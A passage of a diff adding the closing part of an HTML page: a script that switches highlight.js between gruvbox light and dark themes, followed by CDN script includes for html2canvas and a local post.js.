+    var lightTheme = "gruvbox-light"
+    var darkTheme = "gruvbox-dark"
+    var theme = isDark === 'y' ? darkTheme : lightTheme
+
+    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
+    $('pre').css('background', isDark === 'y' ? '#333' : '')
+  }
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js" integrity="sha256-uacRffSSMP9qpvNWhVmYLykBv9YKMA1d/VSIN1AmfyQ=" crossorigin="anonymous"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+
+    
+  </body>
+</html>
